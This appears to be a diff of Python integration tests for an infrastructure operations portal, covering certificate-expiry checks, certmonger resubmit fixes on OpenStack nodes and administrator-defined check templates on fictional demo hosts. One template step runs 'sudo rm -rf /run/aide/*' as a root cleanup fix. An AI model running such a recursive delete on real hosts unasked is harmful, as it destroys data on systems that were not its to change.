+        self.assertEqual(st["vcdlib"]["status"], "warn", st["vcdlib"])   # the console proxy certificate in use: 15 days
+        lib = {r[0]: r for r in st["vcdlib"]["table"]["rows"]}
+        self.assertEqual(lib["console-proxy-dca"][4:], [15, "1: vcd-cell-01 console proxy", "WARN"])
+        self.assertEqual(lib["old-lb-cert"][5:], ["none", "expires soon (not in use)"])
+        self.assertEqual(st["vcdtrust"]["status"], "warn", st["vcdtrust"])   # an older certificate of the same name trusted
+        self.assertIn("still trusts an older certificate of: vCenter, NSX-T Manager", st["vcdtrust"]["detail"])
+        self.assertEqual(st["ontap"]["status"], "fail", st["ontap"])   # svm-cinder expired 3 days ago
+        ontap = {r[1]: r for r in st["ontap"]["table"]["rows"] if r[2] == "server"}
+        self.assertEqual(ontap["svm-cinder"][5:], [-3, "EXPIRED"])
+        self.assertEqual(ontap["DCA-ONTAP"][5:], [12, "WARN"])   # the cluster certificate: the admin SVM, named as the cluster
+        self.assertIn("1 of them expire soon or have expired", st["ontap"]["detail"])
+        recs = item["result"]["recommendations"]
+        text = " ".join(x for rec in recs for x in rec["commands"])
+        self.assertIn("./fixsts.sh", text)
+        self.assertIn("CertMgrRefreshCertificates_Task(@((Get-VMHost esxi-dca-03).ExtensionData.MoRef))", text)
+        self.assertIn("security certificate create -vserver svm-cinder -common-name svm-cinder -type server", text)
+        self.assertIn("security ssl modify -vserver DCA-ONTAP -server-enabled true", text)
+        self.assertTrue(st["overview"].get("open"))
+        self.assertNotIn("Get-VMHost esxi-dca-01)", text)
+        urls = " ".join(ref["url"] for rec in recs for ref in rec.get("references") or [])
+        for kb in ("318968", "374032", "424553", "certificate-library", "How_to_renew_an_ONTAP"):
+            self.assertIn(kb, urls)
+        self.assertFalse(any(rec.get("action") for rec in recs))   # Acme Prime and ONTAP certificates: no fix from the portal
+
+    def test_certmonger(self):
+        try:
+            self._certmonger()
+        finally:   # the fake cloud forgets the resubmits: the certificates expire again for the other runs
+            if os.path.exists(os.path.join(TMP, "cloud-state.json")):
+                os.remove(os.path.join(TMP, "cloud-state.json"))
+
+    def _certmonger(self):
+        """certmonger on the director and the overcloud nodes (TLS everywhere, RISET-KNOWN-ISSUES 2.2), and the fix that
+        resubmits the ticked requests."""
+        c = self.client()
+        item = self.run_check(c, "certmonger-status", {})
+        st = {s["key"]: s for s in item["result"]["steps"]}
+        self.assertEqual(st["undercloud"]["status"], "warn", st["undercloud"])   # 12 days left on the director
+        self.assertEqual(st["undercloud"]["table"]["rows"][0][6:], [12, "yes", "WARN"])
+        self.assertEqual(st["nodes"]["status"], "ok", st["nodes"])
+        self.assertEqual(st["requests"]["status"], "fail", st["requests"])
+        self.assertIn("1 that certmonger cannot renew (CA problem or stuck), 1 expiring", st["requests"]["detail"])
+        first = st["requests"]["table"]["rows"][0]
+        self.assertEqual((first[0], first[1], first[7], first[9]), ("overcloud-controller-0", "20240101000010", 5, "FAIL"))
+        self.assertIn("CA_UNREACHABLE: Server at https://idm-01.prime.local", first[5])
+        recs = item["result"]["recommendations"]
+        ca = next(r for r in recs if r["text"].startswith("certmonger on overcloud-controller-0 cannot renew"))
+        self.assertIn("sudo getcert resubmit -i 20240101000010", ca["commands"])
+        self.assertIn("ssh heat-admin@192.168.253.10", ca["where"])
+        director = next(r for r in recs if r["where"] == "OpenStack director, as stack")
+        self.assertTrue(any("5508191" in ref["url"] for ref in director["references"]))
+        item = self.run_check(c, "certmonger-status", {"role": "compute"})
+        st = {s["key"]: s for s in item["result"]["steps"]}
+        self.assertEqual(st["nodes"]["status"], "warn", st["nodes"])   # overcloud-novacompute-3 does not answer
+        self.assertEqual(st["requests"]["status"], "ok", st["requests"])
+        # ---- the fix: the requests of the nodes, soonest first; a CA problem is not ticked (IdM first)
+        osfix = self.client("osfixer", "demo-operator-5")
+        item = self.run_check(osfix, "certmonger-status", {})
+        recs = item["result"]["recommendations"]
+        idx = next(i for i, x in enumerate(recs) if (x.get("action") or {}).get("label") == "Resubmit the ticked certificates")
+        fx = item["fixes"][idx]
+        self.assertEqual((fx["risk"], fx["available"], len(fx["items"])), ("normal", True, 2), fx)
+        self.assertEqual([i["default"] for i in fx["items"]], [False, True])
+        self.assertEqual(fx["items"][1]["commands"],
+                         ["getcert-resubmit 20240101000020 node overcloud-controller-1=192.168.253.11 user heat-admin"])
+        self.assertEqual(recs[idx]["items"]["rows"][0][:2], ["overcloud-controller-0", "20240101000010"])
+        r = osfix.post(f"/wi/api/runs/{item['id']}/fixes/{idx}", json={"selected": [1]})
+        self.assertEqual(r.status_code, 200, r.get_json())
+        fix = self.wait_fix(osfix, r.get_json()["action_id"])
+        out = json.dumps(fix["output"])
+        self.assertEqual(fix["status"], "ok", out)
+        self.assertIn("sudo getcert resubmit -i 20240101000020", out)
+        self.assertIn("request 20240101000020 on overcloud-controller-1 renewed", out)
+        again = self.wait_run(osfix, fix["verify_run_id"])   # the check again: controller-1 renewed, controller-0 not
+        st = {s["key"]: s for s in again["result"]["steps"]}
+        self.assertIn("1 that certmonger cannot renew (CA problem or stuck), 0 expiring", st["requests"]["detail"])
+        rows = {(x[0], x[1]): x for x in st["requests"]["table"]["rows"]}
+        self.assertEqual(rows[("overcloud-controller-1", "20240101000020")][7:], [730, "yes", "OK"])
+        recs = again["result"]["recommendations"]
+        idx = next(i for i, x in enumerate(recs) if (x.get("action") or {}).get("label") == "Resubmit the ticked certificates")
+        r = osfix.post(f"/wi/api/runs/{again['id']}/fixes/{idx}", json={"selected": [0]})   # IdM unreachable: not renewed
+        fix = self.wait_fix(osfix, r.get_json()["action_id"])
+        out = json.dumps(fix["output"])
+        self.assertNotEqual(fix["status"], "ok", out)
+        self.assertIn("certmonger could not renew request 20240101000010 on overcloud-controller-0: CA_UNREACHABLE", out)
+
+    def test_templates(self):
+        try:
+            self._templates()
+        finally:   # the fake hosts forget the fixes: other tests expect their problems
+            if os.path.exists(os.path.join(TMP, "hosts-state.json")):
+                os.remove(os.path.join(TMP, "hosts-state.json"))
+
+    def _templates(self):
+        admin = self.client()
+        ops = admin.post("/wi/api/credentials", json={"name": "tpl-ops", "username": "root", "auth": "key", "privilege": "root",
+                                                      "fixes": True, "secret": new_key()}).get_json()["id"]
+        r = admin.post("/wi/api/hosts", json={"site": "DCA", "group": "cdn", "name": "dca-cdn-lb-09", "address": "172.31.10.79",
+                                              "credential_id": ops})
+        self.assertEqual(r.status_code, 200, r.get_json())
+        body = {"name": "AIDE files on /run", "summary": "", "activity": "troubleshoot", "category": "cdn", "group": "cdn",
+                "steps": [{"title": "Usage of /run", "command": "df -Pk /run", "problem_if": "9[0-9]%", "warning_if": "8[0-9]%"},
+                          {"title": "Delete the AIDE files", "command": "sudo rm -rf /run/aide/*", "wait": 2}]}
+        # only administrators make templates; the portal (not the form) says what a step does
+        l1 = self.client("l1", "demo-operator-1")
+        self.assertEqual(l1.post("/wi/api/templates", json=body).status_code, 403)
+        self.assertEqual(l1.post("/wi/api/templates/classify", json={"group": "cdn", "commands": ["df -h"]}).status_code, 403)
+        modes = admin.post("/wi/api/templates/classify", json={"group": "cdn", "commands": ["df -Pk /run", "sudo rm -rf /run/aide/*",
+                                                                                           "cat /etc/hosts > /tmp/x"]}).get_json()["items"]
+        self.assertEqual([m["mode"] for m in modes], ["read", "change", "change"])
+        self.assertIn("writes the output to a file", modes[2]["why"])
+        bad = dict(body, group="huawei", steps=[{"title": "x", "command": "system-view"}])
+        self.assertIn("read-only", admin.post("/wi/api/templates", json=bad).get_json()["error"])
+        self.assertEqual(admin.post("/wi/api/templates", json=dict(body, steps=[])).status_code, 400)
+        self.assertEqual(admin.post("/wi/api/templates", json=dict(body, steps=[{"title": "x", "command": "grep -E '(' f",
+                                                                                  "problem_if": "("}])).status_code, 400)
+        r = admin.post("/wi/api/templates", json=body)
+        self.assertEqual(r.status_code, 200, r.get_json())
+        tid = r.get_json()["id"]
+        self.assertEqual(tid, "tpl-aide-files-on-run")
+        self.assertEqual(admin.post("/wi/api/templates", json=body).status_code, 400)   # the same name twice
+        # listed with the checks, runnable by every user of the module
+        cat = {c["id"]: c for c in l1.get("/wi/api/catalog?site=DCA").get_json()["checks"]}
+        self.assertEqual((cat[tid]["basis"], cat[tid]["activity"], cat[tid]["category"]), ("template", "troubleshoot", "cdn"))
+        self.assertTrue(cat[tid]["access"]["runnable"], cat[tid]["access"])
+        self.assertEqual([s["mode"] for s in cat[tid]["template"]["steps"]], ["read", "change"])
+        item = self.run_check(l1, tid, {"host": "dca-cdn-lb-09"})
+        self.assertEqual(self.steps(item), {"conn": "ok", "s1": "fail"}, item)
+        self.assertIn("97%", next(s for s in item["result"]["steps"] if s["key"] == "s1")["detail"])
+        idx = next(i for i, f in enumerate(item["fixes"]) if f)
+        self.assertEqual(item["result"]["recommendations"][idx]["action"]["commands"], ["sudo rm -rf /run/aide/*", "sleep 2"])
+        self.assertFalse(item["fixes"][idx]["available"])   # l1 may not run fixes
+        # the change steps: a fix of risk high, after the host name is typed
+        fixer = self.client("fixer", "demo-operator-3")
+        item = self.run_check(fixer, tid, {"host": "dca-cdn-lb-09"})
+        idx = next(i for i, f in enumerate(item["fixes"]) if f)
+        self.assertEqual((item["fixes"][idx]["available"], item["fixes"][idx]["risk"]), (True, "high"), item["fixes"])
+        self.assertEqual(fixer.post(f"/wi/api/runs/{item['id']}/fixes/{idx}", json={"confirm": "x"}).status_code, 400)
+        r = fixer.post(f"/wi/api/runs/{item['id']}/fixes/{idx}", json={"confirm": "dca-cdn-lb-09"})
+        self.assertEqual(r.status_code, 200, r.get_json())
+        fix = self.wait_fix(fixer, r.get_json()["action_id"])
+        self.assertEqual(fix["status"], "ok", fix)
+        again = self.wait_run(fixer, fix["verify_run_id"])
+        self.assertEqual(self.steps(again)["s1"], "ok", again)
+        # an administrator changes and deletes it; the changes are in the portal events
+        self.assertEqual(admin.put(f"/wi/api/templates/{tid}", json=dict(body, name="AIDE on /run")).status_code, 200)
+        self.assertEqual(admin.get(f"/wi/api/templates/{tid}").get_json()["template"]["name"], "AIDE on /run")
+        self.assertEqual(l1.delete(f"/wi/api/templates/{tid}").status_code, 403)
+        self.assertEqual(admin.delete(f"/wi/api/templates/{tid}").status_code, 200)
+        self.assertNotIn(tid, {c["id"] for c in admin.get("/wi/api/catalog?site=DCA").get_json()["checks"]})
+        self.assertEqual(admin.post("/wi/api/runs", json={"site": "DCA", "check": tid, "params": {"host": "dca-cdn-lb-09"}}).status_code, 400)
+        events = [e for e in admin.get("/api/admin/events?kinds=wi").get_json()["events"] if e["action"] == "wi.template"]
+        self.assertEqual(len(events), 3, events)
 
     def test_fixes(self):
         try:
